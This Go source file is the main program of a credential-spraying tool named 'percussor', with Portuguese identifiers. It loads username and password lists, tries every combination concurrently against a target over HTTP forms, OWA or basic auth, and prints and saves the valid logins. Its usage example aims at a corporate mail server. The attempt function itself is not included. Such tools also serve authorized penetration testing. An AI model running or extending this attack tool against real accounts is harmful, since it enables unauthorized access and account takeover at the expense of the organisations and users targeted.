package main

import (
	"bufio"
	"flag"
	"fmt"
	"os"
	"strings"
	"sync"
	"time"
)

const versao = "0.1.0"

func banner() {
	fmt.Print(BOLD + C)
	fmt.Print(`
 ██████╗ ███████╗██████╗  ██████╗██╗   ██╗███████╗███████╗ ██████╗ ██████╗
 ██╔══██╗██╔════╝██╔══██╗██╔════╝██║   ██║██╔════╝██╔════╝██╔═══██╗██╔══██╗
 ██████╔╝█████╗  ██████╔╝██║     ██║   ██║███████╗███████╗██║   ██║██████╔╝
 ██╔═══╝ ██╔══╝  ██╔══██╗██║     ██║   ██║╚════██║╚════██║██║   ██║██╔══██╗
 ██║     ███████╗██║  ██║╚██████╗╚██████╔╝███████║███████║╚██████╔╝██║  ██║
 ╚═╝     ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝
`)
	fmt.Print(RST)
	fmt.Printf(DIM+"  credential sprayer  |  v%s\n\n"+RST, versao)
}

func carregarLista(caminho string) ([]string, error) {
	f, err := os.Open(caminho)
	if err != nil {
		return nil, err
	}
	defer f.Close()

	var lista []string
	sc := bufio.NewScanner(f)
	for sc.Scan() {
		linha := strings.TrimSpace(sc.Text())
		if linha != "" && !strings.HasPrefix(linha, "#") {
			lista = append(lista, linha)
		}
	}
	return lista, sc.Err()
}

func main() {
	alvo     := flag.String("t",     "",         "alvo (URL ou host:porta)")
	arqUsr   := flag.String("u",     "",         "arquivo de usuarios ou usuario unico")
	arqPwd   := flag.String("p",     "",         "arquivo de senhas ou senha unica")
	proto    := flag.String("proto", "http",     "protocolo: http, owa, basico")
	campoUsr := flag.String("fu",    "username", "campo de usuario no form")
	campoPwd := flag.String("fp",    "password", "campo de senha no form")
	nThreads := flag.Int("T",        5,          "threads simultaneas")
	delayMs  := flag.Int("d",        0,          "delay entre tentativas em ms")
	arqSaida := flag.String("o",     "",         "salvar validos em arquivo")
	verboso  := flag.Bool("v",       false,      "verboso")
	flag.Parse()

	banner()

	if *alvo == "" || *arqUsr == "" || *arqPwd == "" {
		fmt.Fprintf(os.Stderr, R+"[!] "+RST+"-t, -u e -p sao obrigatorios\n\n")
		fmt.Fprintf(os.Stderr, "uso: percussor -t <alvo> -u <usuarios> -p <senhas> [opcoes]\n")
		fmt.Fprintf(os.Stderr, "     percussor -t https://mail.corp.com -u users.txt -p senhas.txt -proto owa -T 3 -d 1500\n\n")
		flag.PrintDefaults()
		os.Exit(1)
	}

	var usuarios, senhas []string
	var err error

	if _, err = os.Stat(*arqUsr); err == nil {
		if usuarios, err = carregarLista(*arqUsr); err != nil {
			fmt.Fprintf(os.Stderr, R+"[!] "+RST+"erro lendo usuarios: %v\n", err)
			os.Exit(1)
		}
	} else {
		usuarios = []string{*arqUsr}
	}

	if _, err = os.Stat(*arqPwd); err == nil {
		if senhas, err = carregarLista(*arqPwd); err != nil {
			fmt.Fprintf(os.Stderr, R+"[!] "+RST+"erro lendo senhas: %v\n", err)
			os.Exit(1)
		}
	} else {
		senhas = []string{*arqPwd}
	}

	total := len(usuarios) * len(senhas)

	fmt.Printf(DIM+"[*] alvo     : "+RST+"%s\n", *alvo)
	fmt.Printf(DIM+"[*] proto    : "+RST+"%s\n", *proto)
	fmt.Printf(DIM+"[*] usuarios : "+RST+"%d\n", len(usuarios))
	fmt.Printf(DIM+"[*] senhas   : "+RST+"%d\n", len(senhas))
	fmt.Printf(DIM+"[*] total    : "+RST+"%d tentativas\n", total)
	fmt.Printf(DIM+"[*] threads  : "+RST+"%d\n\n", *nThreads)

	cfg := config{
		alvo:     *alvo,
		proto:    *proto,
		campoUsr: *campoUsr,
		campoPwd: *campoPwd,
		delay:    time.Duration(*delayMs) * time.Millisecond,
		verboso:  *verboso,
	}

	pares      := make(chan par, total)
	resultados := make(chan resultado, 256)
	var wg sync.WaitGroup

	go func() {
		for _, u := range usuarios {
			for _, s := range senhas {
				pares <- par{usuario: u, senha: s}
			}
		}
		close(pares)
	}()

	for i := 0; i < *nThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for p := range pares {
				resultados <- tentar(cfg, p)
			}
		}()
	}

	go func() {
		wg.Wait()
		close(resultados)
	}()

	var validos []resultado
	tentativas := 0

	for r := range resultados {
		tentativas++
		if r.ok {
			validos = append(validos, r)
			fmt.Printf(G+BOLD+"[+] "+RST+G+"%s"+RST+":"+G+"%s"+RST+"\n", r.p.usuario, r.p.senha)
		} else if *verboso {
			fmt.Printf(DIM+"[-] %s:%s  [%d]\n"+RST, r.p.usuario, r.p.senha, r.status)
		}
	}

	fmt.Printf("\n" + DIM + "════════════════════════════════════════\n" + RST)
	fmt.Printf("  tentativas : %d\n", tentativas)
	if len(validos) > 0 {
		fmt.Printf("  validos    : "+G+BOLD+"%d\n"+RST, len(validos))
	} else {
		fmt.Printf("  validos    : 0\n")
	}
	fmt.Printf(DIM + "════════════════════════════════════════\n" + RST)

	if *arqSaida != "" && len(validos) > 0 {
		salvar(*arqSaida, validos)
	}
}
